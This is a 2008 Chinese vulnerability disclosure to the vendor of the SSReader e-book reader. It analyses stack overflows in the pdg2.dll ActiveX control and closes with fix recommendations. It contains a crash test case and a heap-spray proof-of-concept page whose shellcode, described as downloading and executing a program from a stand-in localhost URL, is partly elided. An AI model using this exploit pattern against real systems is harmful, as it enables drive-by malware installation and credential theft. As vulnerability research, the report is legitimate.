
# 超星阅读器 pdg2.dll ActiveX 栈溢出 0day 漏洞报告

> 原文：[`www.pediy.com/kssd/pediy10/70050.html`](https://www.pediy.com/kssd/pediy10/70050.html)

几点说明：

1. 该漏洞我曾经发表在《黑客防线》2007 年第 9 期杂志上，经过修改，现发布本评测报告；
2. 年初曾将此文转给超星公司技术人员，同时该漏洞也是“看雪论坛辞旧迎新 Exploit Me 挑战赛”的第二题；
3. 发布本评测报告旨在支持『软件安全评测版』成立，祝本版越办越好！

## 测试报告题目

超星阅读器 pdg2.dll ActiveX 栈溢出 0day 漏洞报告

## 基本信息

报告类型：漏洞分析

报告提交人：张东辉\[shineast\]

报告人背景：西安交通大学智能网络与网络安全教育部重点实验室，看雪软件安全评测中心

联系方式：http://hi.baidu.com/shineastdh

报告创建日期：2008 年 8 月 4 日

最后修改日期：2008 年 8 月 4 日

测试目标名称：超星阅读器

测试目标信息：从超星的网站（http://www.ssreader.com/downland_index.asp）下载最新版的超星阅读器，版本 4.0，更新日期是 2007 年 5 月 11 日，文件大小为 6.8MB。

测试环境和配置：INTEL CPU，内存 1G，Windows XP

安全评测类别得分：（最大值 2）

项目：漏洞的利用：危险等级 2（漏洞会被攻击者利用威胁软件使用者个人信息安全）

分析和测试工具：`OLLYDBG 1.10`

测试周期：1 天

主要存在的安全性问题：该软件注册的 `pdg2.dll` 控件存在多处缓冲区溢出漏洞。

简短摘要：本报告详细分析存在于 `pdg2.dll ActiveX` 中的多处安全漏洞，并给出了对应的技术解决方案，希望能够引超星公司的重视，并尽快修复。

## 报告正文内容

尊敬的超星公司：

您好！

我是西安交通大学智能网络与网络安全教育部重点实验室的研究员，经过我们的对贵公司产品超星阅读器的安全测试，发现该软件注册的 `pdg2.dll` 控件存在多处缓冲区溢出漏洞。这给使用超星的广大用户带来极大的安全隐患。本报告将详细分析存在于 `pdg2.dll ActiveX` 中的多处安全漏洞，希望能够引起贵公司的重视，并尽快修复。

### 漏洞分析

从超星的网站（http://www.ssreader.com/downland_index.asp）下载最新版的超星阅读器，版本 4.0，更新日期是 2007 年 5 月 11 日，文件大小为 6.8MB。下载后安装之，用 `COM Explorer` 可以看到超星在你的系统上注册的几个 ActiveX 控件。其中有一个是，`pdg2.dll`：

![](img/b51b22783508d1f6831c95a858a03da0.jpg)

该控件 CLSID 是`{7F5E27CE-4A5C-11D3-9232-0000B48A05B2}`；文件路径在 `C:\\WINDOWS\\system32\\pdg2.dll`；并且可以看出这个 dll 确实是最新 4.0 版的。

用 `VS2005` 的对象浏览器功能将之打开，可以很清楚的看到这个控件中的变量、函数及函数参数的信息，如下图所示。

![](img/67f2925358288328b4917ec1494e0364.jpg)

可以看出 `pdg2.dll` 这个控件中有很多函数，其中经过我方测试发现存在漏洞的有多个，例如：

`public virtual void DownLoad(string URL, string filename)`
`public virtual void GetRemoteFileTime(string filename)`
`public virtual void GotoBookPage(string URL, uint PageNum, int isDir)`
`public virtual int Register(string RegCode, string UserName)`

下面以 `Register(string RegCode, string UserName)`为例来分析漏洞的成因，其他函数存在的问题与之类似。

以下测试用例用于重现 `Register(string RegCode, string UserName)`函数的缓冲区溢出漏洞：

```html
<html>
<object classid="clsid:7F5E27CE-4A5C-11D3-9232-0000B48A05B2" id='target'></object>
<body>
<SCRIPT language="javascript">
var buffer="";
while (buffer.length < 2048) buffer+="\\x05";
var ok="1111";
target.Register(ok,buffer);
</script>
</body>
</html>
```

上面这段脚本给 `Register` 函数输入了两个字符串参数，一个是正常的；另一个是超长的，内容是 `05050505`…….

将测试用例脚本存为 `test.html`，同时用 `OllyDBG attach IE` 浏览器，然后打开上面这个 `test.html`，`Shift+F7`，过一个异常后，程序会由于下面这个异常而停止下来。

![](img/c5b8e7a79555044a0835d82a89008873.jpg)

该函数的溢出实际上发生在 `pdg2.dll` 中的偏移地址为 `00020228` 的这条指令，即 `call ds:WideCharToMultiByte`。

![](img/0b08e0ddb1db832cca95cc51baad4ef7.jpg)

`WideCharToMultiByte` 函数在 `kernel32` 中是一个宽字符到多字节字符的转换函数。函数原型如下：

```
int WideCharToMultiByte(
UINT CodePage,//指定要转换成的字符集代码页
DWORD dwFlags,//指定如何处理没有转换的字符（一般把它设为 0）
LPCWSTR lpWideCharStr,//待转换的字符串指针
int cchWideChar, //待转换字符串的长度（-1 表示转换到字符串的结尾）
LPSTR lpMultiByteStr, //新串的缓冲区指针
int cbMultiByte, //输出缓冲区大小（如果为 0，lpMultiByteStr 将被忽略，函数将返回所//需缓冲区大小而不使用 lpMultiByteStr
LPCSTR lpDefaultChar,//指向字符的指针， 在指定编码里找不到相应字符时使用此字符//作为默认字符代替
LPBOOL lpUsedDefaultChar//开关变量的指针，用以表明是否使用过默认字符
);
```

看了这个函数的原型和参数的含义后，可以对这个函数有个大体的认识。事实上，调用此函数会很容易导致内存泄漏，因为 `lpWideCharStr` 指向的输入缓冲区大小是宽字符数，而 `lpMultiByteStr` 指向的输出缓冲区大小是字节数。为了避免内存泄漏，应确保为输出缓冲区指定合适的大小。

综上所述，超星的这个漏洞就是由于未检验输入的待转换字符串的长度是否超长，而直接进行转换，并输出到了栈中，虽然计算了长度，但是由于开辟的栈空间不足（只有 `100h=256` 字节），因此直接导致了栈溢出的后果，允许攻击者执行恶意代码。

### 漏洞利用

攻击 POC（proof of concept）如下：

```html
<html>
<object classid="clsid:7F5E27CE-4A5C-11D3-9232-0000B48A05B2" id='target'></object>
<body>
<SCRIPT language="javascript">
  var shellcode = unescape("%u9090"+"%u9090"+
"%uefe9%u0000%u5a00%ua164%u0030%u0000%u408b%u8b0c"+
"%u1c70%u8bad%u0840%ud88b%u738b%u8b3c%u1e74%u0378"+
。。。。。。（略）
"%u6946%u656c%u0041%u7468%u7074%u2f3a%u312f%u3732"+
"%u302e%u302e%u312e%u632f%u6c61%u2e63%u7865%u8065"+
"%u0000");
</script>
<SCRIPT language="javascript">
var bigblock = unescape("%u9090%u9090");
var headersize = 20;
var slackspace = headersize+shellcode.length;
while (bigblock.length<slackspace) bigblock+=bigblock;
fillblock = bigblock.substring(0, slackspace);
block = bigblock.substring(0, bigblock.length-slackspace);
while(block.length+slackspace<0x40000) block = block+block+fillblock;
memory = new Array();
for (x=0; x<100; x++) memory[x] = block +shellcode;
var buffer = '';
while (buffer.length < 1024) buffer+="\\x05";
var ok="1111";
target.Register(ok,buffer);
</script>
</body>
</html>
```

最终的效果如下，可以看到程序弹出了一个计算器。这段脚本的作用就是下载 http://127.0.0.1/calc.exe 并执行。如果其中的 http://127.0.0.1/calc.exe 是被更改为其他 url 地址，攻击者就可以从特定的地址下载一个程序在目标主机上执行。

![](img/e7afc818a2cd17fbc25ef15d9afcea03.jpg)

### 漏洞危害

如果本漏洞被恶意利用，会直接造成安装了超星的用户上网时通过 IE 中毒或中恶意软件，甚至可能丢失私人信息。

对客户端来说，很多网页木马都是利益驱动，偷盗各类帐号密码，如电子银行帐户和密码、游戏帐号和密码、邮箱帐户和密码、QQ/MSN 帐号和密码等；另外，使得客户端被安装恶意插件，强迫浏览黑客指定的网站；或者被利用攻击某个站点等。

对服务器端来说，一方面是系统资源，流量带宽资源的巨大损失，另一方面也成为了传播网页木马的“傀儡帮凶”，严重影响到网站的公众信誉度。

### 漏洞修补方案

由于 `pdg2.dll` 中存在多个安全漏洞，建议超星公司对自己的产品尽快的大检查一遍，赶紧修补自己的漏洞！具体方案如下：

首先在 `pdg2.dll` 中寻找使用了宽字符到多字节字符的转换函数（`WideCharToMultiByte`），应该能找到一批；

然后对于每个调用了该函数的代码，进行检查，检查传入的参数待转换的字符串指针（`lpWideCharStr`）指向的待转换字符串时候未被检查长度，如果未检查长度的话，而且是函数的局部变量的话，一定是存在栈溢出的可能；

其次在找到问题的诸多代码处，修改代码，添加对待转换字符串检查的代码。这样基本上就大大减少了通过该函数发生栈溢出的可能性。

对软件进行严格的安全性测试，攻击测试。

对源代码进行严格的安全审计。

看雪软件安全评测中心及西安交通大学网络安全实验室可提供类似的软件安全咨询，审计以及安全编码培训等服务。

最后需要根据本漏洞的模型，寻找出类似的函数调用，类似上面的过程检查对函数传入的参数，尤其是局部变量，因为局部变量是存储在函数栈帧中的。如果发现有类似的漏洞，请一并修补。
